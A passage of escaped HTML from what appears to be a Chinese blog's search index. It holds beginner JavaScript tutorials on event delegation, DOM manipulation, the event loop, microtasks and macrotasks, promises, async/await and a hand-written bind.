  &amp;lt;li&amp;gt;item 3&amp;lt;/li&amp;gt;
  ......
  &amp;lt;li&amp;gt;item n&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
// ...... 代表中间还有未知数个 li
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们来实现把 #list 下的 li 元素的事件代理委托到它的父层元素也就是 #list 上：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 给父层元素绑定事件
document.getElementById(&#39;list&#39;).addEventListener(&#39;click&#39;, function (e) {
  // 兼容性处理
  var event = e || window.event;
  var target = event.target || event.srcElement;
  // 判断是否匹配目标元素
  if (target.nodeName.toLocaleLowerCase === &#39;li&#39;) {
    console.log(&#39;the content is: &#39;, target.innerHTML);
  }
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在上述代码中， target 元素则是在 #list 元素之下具体被点击的元素，然后通过判断 target 的一些属性（比如：nodeName，id 等等）可以更精确地匹配到某一类 #list li 元素之上；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用 Element.matches 精确匹配&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果改变下 HTML 成：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;ul id=&amp;quot;list&amp;quot;&amp;gt;
  &amp;lt;li className=&amp;quot;class-1&amp;quot;&amp;gt;item 1&amp;lt;/li&amp;gt;
  &amp;lt;li&amp;gt;item 2&amp;lt;/li&amp;gt;
  &amp;lt;li className=&amp;quot;class-1&amp;quot;&amp;gt;item 3&amp;lt;/li&amp;gt;
  ......
  &amp;lt;li&amp;gt;item n&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
// ...... 代表中间还有未知数个 li
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里，我们想把 #list 元素下的 li 元素（并且它的 class 为 class-1）的点击事件委托代理到 #list 之上；&lt;/p&gt;
&lt;p&gt;如果通过上述的方法我们还需要在 &lt;code&gt;if (target.nodeName.toLocaleLowerCase === &#39;li&#39;)&lt;/code&gt; 判断之中在加入一个判断 &lt;code&gt;target.nodeName.className === &#39;class-1&#39;&lt;/code&gt;；&lt;/p&gt;
&lt;p&gt;但是如果想像 CSS 选择器般做更加灵活的匹配的话，上面的判断未免就太多了，并且很难做到灵活性，这里可以使用 &lt;code&gt;Element.matches API&lt;/code&gt; 来匹配；&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Element.matches API&lt;/code&gt;的基本使用方法: &lt;code&gt;Element.matches(selectorString)&lt;/code&gt;，&lt;code&gt;selectorString&lt;/code&gt; 既是 CSS 那样的选择器规则，比如本例中可以使用 &lt;code&gt;target.matches(&#39;li.class-1&#39;)&lt;/code&gt;，他会返回一个布尔值，如果 target 元素是标签 li 并且它的类是 class-1 ，那么就会返回 true，否则返回 false；&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/26536815&#34;&gt;JavaScript 事件委托详解&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Element/matches&#34;&gt;MDN-Element/matches&lt;/a&gt;&lt;/p&gt;
">106-js-22-事件</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-webapi-dom/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;DOM本质：一棵树&lt;br&gt;
HTML和DOM的区别：HTML是文件或者说一段代码，DOM是浏览器内存中已经初始化好的一棵树，树的结构&lt;/p&gt;
&lt;h2 id=&#34;获取-dom-节点&#34;&gt;获取 DOM 节点&lt;/h2&gt;
&lt;p&gt;getElementById&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const div1 = document.getElementById(&#39;div1&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;getElementsByTagName&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const divList = document.getElementsByTagName(&#39;div&#39;) // 集合
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;getElementsByClassName&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const containerList = document.getElementsByClassName(&#39;container&#39;) // 集合
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;querySelectorAll&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const pList = document.querySelectorAll(&#39;p&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;property-和-attribute&#34;&gt;property 和 attribute&lt;/h2&gt;
&lt;p&gt;property：修改JS对象属性，不会体现到HTML结构中&lt;/p&gt;
&lt;p&gt;attribute：修改HTML属性，会改变HTML 结构（标签结构）&lt;/p&gt;
&lt;p&gt;两者都有可能引起DOM重新渲染&lt;/p&gt;
&lt;p&gt;建议：尽量用 property 操作，因为property可能会在JS机制中，避免一些不必要的DOM渲染；但是attribute是修改HTML结构，一定会引起DOM结构的重新渲染，而DOM重新渲染是比较耗费性能的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const pList = document.querySelectorAll(&#39;p&#39;)
const p1 = pList[0]

// property 形式
p1.style.width = &#39;100px&#39;
console.log( p1.style.width )
p1.className = &#39;red&#39;
console.log( p1.className )
console.log(p1.nodeName) // p
console.log(p1.nodeType) // 1

// attribute
p1.setAttribute(&#39;data-name&#39;, &#39;imooc&#39;)
console.log( p1.getAttribute(&#39;data-name&#39;) )
p1.setAttribute(&#39;style&#39;, &#39;font-size: 50px;&#39;)
console.log( p1.getAttribute(&#39;style&#39;) )
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;dom结构操作&#34;&gt;DOM结构操作&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const div1 = document.getElementById(&#39;div1&#39;)
const div2 = document.getElementById(&#39;div2&#39;)

// 新建节点
const newP = document.createElement(&#39;p&#39;)
newP.innerHTML = &#39;this is newP&#39;
// 插入节点
div1.appendChild(newP)

// 移动节点
const p1 = document.getElementById(&#39;p1&#39;)
div2.appendChild(p1)

// 获取父元素
console.log( p1.parentNode )

// 获取子元素列表
const div1ChildNodes = div1.childNodes
console.log( div1.childNodes )
const div1ChildNodesP = Array.prototype.slice.call(div1.childNodes).filter(child =&amp;gt; {
    if (child.nodeType === 1) {
        return true
    }
    return false
})
console.log(&#39;div1ChildNodesP&#39;, div1ChildNodesP)

div1.removeChild( div1ChildNodesP[0] )
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;dom操作性能优化&#34;&gt;DOM操作性能优化&lt;/h2&gt;
&lt;p&gt;避免频繁的 DOM 操作&lt;/p&gt;
&lt;h3 id=&#34;对-dom-查询做缓存&#34;&gt;对 DOM 查询做缓存&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 不缓存 DOM 查询结果
for (let i = 0; i &amp;lt; document.getElementsByTagName(&#39;p&#39;).length; i++) {
  // 每次循环，都会计算length，频繁进行DOM查询
}

// 缓存 DOM 查询结果
const pList = document.getElementsByTagName(&#39;p&#39;)
const length = pList.length
for (let i = 0; i &amp;lt; length; i++) {
  // 缓存length，只进行一次DOM查询
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;将频繁操作改为一次性操作&#34;&gt;将频繁操作改为一次性操作&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const list = document.getElementById(&#39;list&#39;)
for (let i  = 0; i &amp;lt; 20; i++) {
    const li = document.createElement(&#39;li&#39;)
    li.innerHTML = `List item ${i}`
    list.appendChild(li)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const list = document.getElementById(&#39;list&#39;)

// 创建一个文档片段，此时还没有插入到 DOM 结构中
const frag = document.createDocumentFragment()

for (let i  = 0; i &amp;lt; 20; i++) {
    const li = document.createElement(&#39;li&#39;)
    li.innerHTML = `List item ${i}`

    // 先插入文档片段中
    frag.appendChild(li)
}

// 都完成之后，再统一插入到 DOM 结构中
list.appendChild(frag)

console.log(list)
&lt;/code&gt;&lt;/pre&gt;
">105-js-21-Dom</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-wei-ren-wu-he-hong-ren-wu/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;- 宏任务：setTimeout setInterval Ajax DOM 事件&lt;/p&gt;
&lt;p&gt;- 微任务：Promise async/await（对于前端来说）&lt;/p&gt;
&lt;p&gt;- 微任务比宏任务执行的更早&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;console.log(100)
setTimeout(() =&amp;gt; {
    console.log(200)
})
Promise.resolve().then(() =&amp;gt; {
    console.log(300)
})
console.log(400)
// 100 400 300 200
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;event-loop-和-dom-渲染&#34;&gt;event loop 和 DOM 渲染&lt;/h2&gt;
&lt;p&gt;再次回顾 event loop 的过程&lt;/p&gt;
&lt;p&gt;- 每一次 call stack 结束，都会触发 DOM 渲染（不一定非得渲染，就是给一次 DOM 渲染的机会！！！）&lt;/p&gt;
&lt;p&gt;- 然后再进行 event loop&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const $p1 = $(&#39;&amp;lt;p&amp;gt;一段文字&amp;lt;/p&amp;gt;&#39;)
const $p2 = $(&#39;&amp;lt;p&amp;gt;一段文字&amp;lt;/p&amp;gt;&#39;)
const $p3 = $(&#39;&amp;lt;p&amp;gt;一段文字&amp;lt;/p&amp;gt;&#39;)
$(&#39;#container&#39;)
            .append($p1)
            .append($p2)
            .append($p3)

console.log(&#39;length&#39;,  $(&#39;#container&#39;).children().length )
alert(&#39;本次 call stack 结束，DOM 结构已更新，但尚未触发渲染&#39;)
// （alert 会阻断 js 执行，也会阻断 DOM 渲染，便于查看效果）
// 到此，即本次 call stack 结束后（同步任务都执行完了），浏览器会自动触发渲染，不用代码干预

// 另外，按照 event loop 触发 DOM 渲染时机，setTimeout 时 alert ，就能看到 DOM 渲染后的结果了
setTimeout(function () {
    alert(&#39;setTimeout 是在下一次 Call Stack ，就能看到 DOM 渲染出来的结果了&#39;)
})
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1631147264569.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;宏任务和微任务的区别&#34;&gt;宏任务和微任务的区别&lt;/h2&gt;
&lt;p&gt;- 宏任务：DOM 渲染后再触发&lt;/p&gt;
&lt;p&gt;- 微任务：DOM 渲染前会触发&lt;/p&gt;
&lt;p&gt;再深入思考一下：为何两者会有以上区别，一个在渲染前，一个在渲染后？&lt;/p&gt;
&lt;p&gt;- 微任务：ES 语法标准之内，JS 引擎来统一处理。即，不用浏览器有任何干预，即可一次性处理完，更快更及时。&lt;/p&gt;
&lt;p&gt;- 宏任务：ES 语法没有，JS 引擎不处理，浏览器（或 nodejs）干预处理。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 修改 DOM
const $p1 = $(&#39;&amp;lt;p&amp;gt;一段文字&amp;lt;/p&amp;gt;&#39;)
const $p2 = $(&#39;&amp;lt;p&amp;gt;一段文字&amp;lt;/p&amp;gt;&#39;)
const $p3 = $(&#39;&amp;lt;p&amp;gt;一段文字&amp;lt;/p&amp;gt;&#39;)
$(&#39;#container&#39;)
    .append($p1)
    .append($p2)
    .append($p3)

// // 微任务：渲染之前执行（DOM 结构已更新）
Promise.resolve().then(() =&amp;gt; {
    const length = $(&#39;#container&#39;).children().length
    alert(`micro task ${length}`)
})

// 宏任务：渲染之后执行（DOM 结构已更新）
setTimeout(() =&amp;gt; {
    const length = $(&#39;#container&#39;).children().length
    alert(`macro task ${length}`)
})
&lt;/code&gt;&lt;/pre&gt;
">104-js-20-微任务和宏任务</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-for-of/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;for ... in 以及 forEach for 是常规的同步遍历；&lt;br&gt;
for... of 用于异步的遍历。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 定时算乘法
function multi(num) {
    return new Promise((resolve) =&amp;gt; {
        setTimeout(() =&amp;gt; {
            resolve(num * num)
        }, 1000)
    })
}

// // 使用 forEach ，是 1s 之后打印出所有结果，即 3 个值是一起被计算出来的
function test1 () {
    const nums = [1, 2, 3];
    nums.forEach(async x =&amp;gt; {
        const res = await multi(x);
        console.log(res);
    })
}
test1();

// 使用 for...of ，可以让计算挨个串行执行
async function test2 () {
    const nums = [1, 2, 3];
    for (let x of nums) {
        // 在 for...of 循环体的内部，遇到 await 会挨个串行计算
        const res = await multi(x)
        console.log(res)
    }
}
test2()
&lt;/code&gt;&lt;/pre&gt;
">103-js-19-for-of</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-async-he-await/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;异步回调容易导致callback hell。&lt;br&gt;
Promise then catch链式调用虽把层级铺开，但也是基于回调函数。&lt;br&gt;
async/await能彻底消灭回调函数，用同步语法编写异步代码。async/await和promise并不冲突。&lt;/p&gt;
&lt;h2 id=&#34;使用场景&#34;&gt;使用场景&lt;/h2&gt;
&lt;p&gt;await后面不仅可以跟promise，还可以跟async&lt;/p&gt;
&lt;h2 id=&#34;代码示例&#34;&gt;代码示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function loadImg(src) {
    const promise = new Promise((resolve, reject) =&amp;gt; {
        const img = document.createElement(&#39;img&#39;)
        img.onload = () =&amp;gt; {
            resolve(img)
        }
        img.onerror = () =&amp;gt; {
            reject(new Error(`图片加载失败 ${src}`))
        }
        img.src = src
    })
    return promise
}

async function loadImg1() {
    const src1 = &#39;http://www.imooc.com/static/img/index/logo_new.png&#39;
    const img1 = await loadImg(src1)
    return img1
}

async function loadImg2() {
    const src2 = &#39;https://avatars3.githubusercontent.com/u/9583120&#39;
    const img2 = await loadImg(src2)
    return img2
}

(async function () {
    // 注意：await 必须放在 async 函数中，否则会报错
    try {
        // 加载第一张图片
        const img1 = await loadImg1()
        console.log(img1)
        // 加载第二张图片
        const img2 = await loadImg2()
        console.log(img2)
    } catch (ex) {
        console.error(ex)
    }
})()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;和promise的关系&#34;&gt;和promise的关系&lt;/h2&gt;
&lt;p&gt;执行 async 函数，返回的是 Promise 对象&lt;/p&gt;
&lt;p&gt;await 相当于 Promise 的 then&lt;/p&gt;
&lt;p&gt;try...catch 可捕获异常，代替了 Promise 的 catch&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;- async 封装 Promise&lt;/p&gt;
&lt;p&gt;- await 处理 Promise 成功&lt;/p&gt;
&lt;p&gt;- try...catch 处理 Promise 失败&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;async&#34;&gt;async&lt;/h3&gt;
&lt;p&gt;async 函数返回结果都是 Promise 对象（如果函数内没返回 Promise ，则自动封装一下）&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;async function fn2() {
    return new Promise(() =&amp;gt; {})
}
console.log( fn2() )

async function fn1() {
    return 100
}
console.log( fn1() ) // 相当于 Promise.resolve(100)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;await&#34;&gt;await&lt;/h3&gt;
&lt;p&gt;await 后面跟 Promise 对象：会阻断后续代码，等待状态变为 resolved ，才获取结果并继续执行&lt;/p&gt;
&lt;p&gt;await 后续跟非 Promise 对象：会直接返回&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;(async function () {
    const p1 = new Promise(() =&amp;gt; {})
    await p1
    console.log(&#39;p1&#39;) // 不会执行
})()

(async function () {
    const p2 = Promise.resolve(100)
    const res = await p2
    console.log(res) // 100
})()

(async function () {
    const res = await 100
    console.log(res) // 100
})()

(async function () {
    const p3 = Promise.reject(&#39;some err&#39;)
    const res = await p3
    console.log(res) // 不会执行
})()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;trycatch&#34;&gt;try...catch&lt;/h3&gt;
&lt;p&gt;try...catch 捕获 rejected 状态&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;(async function () {
    const p4 = Promise.reject(&#39;some err&#39;)
    try {
        const res = await p4
        console.log(res)
    } catch (ex) {
        console.error(ex)
    }
})()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;异步本质&#34;&gt;异步本质&lt;/h2&gt;
&lt;p&gt;await 是同步写法，但本质还是异步调用。&lt;/p&gt;
&lt;p&gt;即，只要遇到了 &lt;code&gt;await&lt;/code&gt; ，后面的代码都相当于放在 callback 里。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;async function async1 () {
  console.log(&#39;async1 start&#39;)
  await async2()
  console.log(&#39;async1 end&#39;) // 关键在这一步，它相当于放在 callback 中，最后执行
}

async function async2 () {
  console.log(&#39;async2&#39;)
}

console.log(&#39;script start&#39;)
async1()
console.log(&#39;script end&#39;)
&lt;/code&gt;&lt;/pre&gt;
">102-js-18-async和await</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-event-loop/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;JS 是单线程运行的&lt;/li&gt;
&lt;li&gt;异步要基于回调来实现&lt;/li&gt;
&lt;li&gt;event loop 就是异步回调的实现机制&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;js-如何执行&#34;&gt;JS 如何执行&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;从前到后，一行一行执行&lt;/li&gt;
&lt;li&gt;如果某一行执行报错，则停止下面代码的执行&lt;/li&gt;
&lt;li&gt;先把同步代码执行完，再执行异步&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;event-loop执行过程&#34;&gt;event loop执行过程&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;1. 同步代码，一行一行放在call stack 中执行
2. 遇到异步，先“记录”下，等待时间（定时，网络请求等）
3. 时机到了，就移动到 calllback queue
4. 如果call stack 为空（即同步代码执行完），event loop开始工作
5. 轮询查找callback queue，如有则移动到call stack 执行
6. 继续轮询查找（永动机一样）
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;代码示例&#34;&gt;代码示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;console.log(&#39;Hi&#39;)

setTimeout(function cb1() {
    console.log(&#39;cb1&#39;) // cb 即 callback
}, 5000)

console.log(&#39;Bye&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;代码执行过程：
1. 将 console.log(&amp;quot;Hi&amp;quot;) 推入调用栈，调用栈会执行代码
2. 执行代码，控制台打印“Hi”，调用栈清空
3. 执行 setTimeout，setTimeout由浏览器定义，不是ES6的内容；将定时器放到Web APIs中，到时间后将回调函数放到回调函数队列中
4. 执行完了setTimeout， 清空调用栈
5. console.log(&amp;quot;Bye&amp;quot;)进入调用栈，执行，调用栈清空
6. 同步代码被执行完,，回调栈空，浏览器内核启动时间循环机制
7. 五秒之后，定时器将cb1推到回调函数队列中
8. 事件循环将cb1放入调用栈
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;dom-事件也用-event-loop&#34;&gt;DOM 事件，也用 event loop&lt;/h2&gt;
&lt;p&gt;DOM 事件不是异步，只是用了回调的方式，然后会用到 event loop&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;button id=&amp;quot;btn1&amp;quot;&amp;gt;提交&amp;lt;/button&amp;gt;

&amp;lt;script&amp;gt;
console.log(&#39;Hi&#39;)

$(&#39;#btn1&#39;).click(function (e) {
    console.log(&#39;button clicked&#39;)
})

console.log(&#39;Bye&#39;)
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
">101-js-17-event loop</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-yi-bu/"" data-c="
          &lt;h2 id=&#34;单线程和异步&#34;&gt;单线程和异步&lt;/h2&gt;
&lt;p&gt;JS 是单线程语言，只能同时做一件事&lt;/p&gt;
&lt;p&gt;浏览器和 nodejs 已支持 JS 启动进程，如 Web Worker&lt;/p&gt;
&lt;p&gt;JS 和 DOM 渲染共用同一个线程，因为 JS 可修改 DOM 结构&lt;/p&gt;
&lt;p&gt;遇到等待（网络请求，定时任务）不能卡住&lt;/p&gt;
&lt;p&gt;需要异步&lt;/p&gt;
&lt;p&gt;回调 callback 函数形式&lt;/p&gt;
&lt;h2 id=&#34;异步和同步的区别&#34;&gt;异步和同步的区别&lt;/h2&gt;
&lt;p&gt;异步不会阻塞代码执行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 异步 通过（callback 回调函数）执行
console.log(100)
setTimeout(() =&amp;gt; {
    console.log(200)
}, 1000)
console.log(300)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同步会阻塞代码执行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 同步
console.log(100)
alert(200)
console.log(300)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;异步的应用场景&#34;&gt;异步的应用场景&lt;/h2&gt;
&lt;h3 id=&#34;网络请求&#34;&gt;网络请求&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;ajax&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// ajax
console.log(&#39;start&#39;)
$.get(&#39;./data.json&#39;, function(data) {
  console.log(data)
})
console.log(&#39;end&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;图片加载&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 图片加载
console.log(&#39;start&#39;)
let img = document.createElement(&#39;img&#39;)
img.onload = function() {
  console.log(&#39;onload&#39;)
}
img.src = &#39;/xx.png&#39;
console.log(&#39;end&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;定时任务&#34;&gt;定时任务&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// setTimeout
console.log(100)
setTimeout(function() {
  console.log(200)
}, 1000)
console.log(300)

// setInterval
console.log(100)
setInterval(function() {
  console.log(200)
}, 1000)
console.log(300)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;promise&#34;&gt;promise&lt;/h2&gt;
&lt;p&gt;主要是用来解决回调地狱的问题，所以出现了promise 。现在主流的方法是使用async 和 await 来进行解决异步问题。 async 和 await 本质上是一个语法糖 使函数的返回值包含在promise中返回。&lt;/p&gt;
&lt;h3 id=&#34;回调地狱&#34;&gt;回调地狱&lt;/h3&gt;
&lt;p&gt;嵌套格式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;$.get(url1, (data1) =&amp;gt; {
  console.log(data1)
  $.get(url2, (data2) =&amp;gt; {
    console.log(data2)
    $.get(url3, (data3) =&amp;gt; {
      console.log(data3)
      // ...
    })
  })
})
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;promise-2&#34;&gt;promise&lt;/h3&gt;
&lt;p&gt;管道格式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function getData(url) {
  return new Promise((resolve, reject) =&amp;gt; {
    $.ajax({
      url,
      success(data) {
        resolve(data)
      },
      error(err) {
        reject(err)
      }
    })
  })
}

const url1 = &#39;/data1.json&#39;
const url2 = &#39;/data2.json&#39;
const url3 = &#39;/data3.json&#39;
getData(url1).then(data1 =&amp;gt; {
  console.log(data1)
  return getData(url2)
}).then(data2 =&amp;gt; {
  console.log(data2)
  return getData(url3)
}).then(data3 =&amp;gt; {
  console.log(data3)  
}).catch(err =&amp;gt; console.log(err))
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;promise加载图片&#34;&gt;promise加载图片&lt;/h3&gt;
&lt;p&gt;如果在 then 中 return 一个普通对象，下一个then中函数的参数会接收到；&lt;br&gt;
如果在 then 中 return 一个Promise实例的话，下一个then 中函数接收到的参数就是新 Promise 的 resovle 的参数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function loadImg(src) {
    const p = new Promise(
        (resolve, reject) =&amp;gt; {
            const img = document.createElement(&#39;img&#39;)
            img.onload = () =&amp;gt; {
                resolve(img)
            }
            img.onerror = () =&amp;gt; {
                const err = new Error(`图片加载失败 ${src}`)
                reject(err)
            }
            img.src = src
        }
    )
    return p
}

// const url = &#39;https://img1.baidu.com/it/u=681100297,1255002990&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=120&amp;amp;f=JPEG?w=890&amp;amp;h=500&#39;
// loadImg(url).then(img =&amp;gt; {
//     console.log(img.width)
//     return img
// }).then(img =&amp;gt; {
//     console.log(img.height)
// }).catch(ex =&amp;gt; console.error(ex))

const url1 = &#39;https://img1.baidu.com/it/u=681100297,1255002990&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=120&amp;amp;f=JPEG?w=890&amp;amp;h=500&#39;
const url2 = &#39;https://img2.baidu.com/it/u=2412886502,2778604333&amp;amp;fm=11&amp;amp;fmt=auto&amp;amp;gp=0.jpg&#39;

loadImg(url1).then(img1 =&amp;gt; {
    console.log(img1.width)
    return img1 // 普通对象
}).then(img1 =&amp;gt; {
    console.log(img1.height)
    return loadImg(url2) // promise 实例
}).then(img2 =&amp;gt; {
    console.log(img2.width)
    return img2
}).then(img2 =&amp;gt; {
    console.log(img2.height)
}).catch(ex =&amp;gt; console.error(ex))

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;三种状态&#34;&gt;三种状态&lt;/h3&gt;
&lt;p&gt;1.pending&lt;br&gt;
2.resloved&lt;br&gt;
3.rejected&lt;/p&gt;
&lt;p&gt;状态变化：&lt;br&gt;
pending-&amp;gt; resloved 或者 pending-&amp;gt;rejected&lt;br&gt;
状态的变化是不可逆的&lt;/p&gt;
&lt;p&gt;状态的表现：&lt;br&gt;
1.pending状态：不会触发then或catch&lt;br&gt;
2.resolved状态：会触发后续的then回调函数&lt;br&gt;
3.rejected状态：会触发后续的catch回调函数&lt;/p&gt;
&lt;p&gt;then和catch改变状态：&lt;/p&gt;
&lt;p&gt;1.then正常返回resolved，里面有报错则返回rejected&lt;br&gt;
2.catch正常返回resolved，里面有报错则返回rejected&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// then() 一般正常返回 resolved 状态的 promise
Promise.resolve().then(() =&amp;gt; {
    return 100
})

// then() 里抛出错误，会返回 rejected 状态的 promise
Promise.resolve().then(() =&amp;gt; {
    throw new Error(&#39;err&#39;)
})

// catch() 不抛出错误，会返回 resolved 状态的 promise
Promise.reject().catch(() =&amp;gt; {
    console.error(&#39;catch some error&#39;)
})

// catch() 抛出错误，会返回 rejected 状态的 promise
Promise.reject().catch(() =&amp;gt; {
    console.error(&#39;catch some error&#39;)
    throw new Error(&#39;err&#39;)
})
&lt;/code&gt;&lt;/pre&gt;
">100-js-16-异步</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/js-shou-xie-bind/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;手写bind&lt;/p&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 模拟 bind
Function.prototype.bind1 = function () {
    // 将参数拆解为数组
    const args = Array.prototype.slice.call(arguments)

    // 获取 this（数组第一项）
    const t = args.shift()

    // fn1.bind(...) 中的 fn1
    const self = this

    // 返回一个函数
    return function () {
        return self.apply(t, args)
    }
}

function fn1(a, b, c) {
    console.log(&#39;this&#39;, this)
    console.log(a, b, c)
    return &#39;this is fn1&#39;
}

const fn2 = fn1.bind1({x: 100}, 10, 20, 30)
const res = fn2()
console.log(res)

&lt;/code&gt;&lt;/pre&gt;
">99-js-15-手写bind</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-this-zhi-xiang/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;this 的取值是在执行时确定的，不是定义时候确定的&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;this的应用场景&#34;&gt;this的应用场景&lt;/h2&gt;
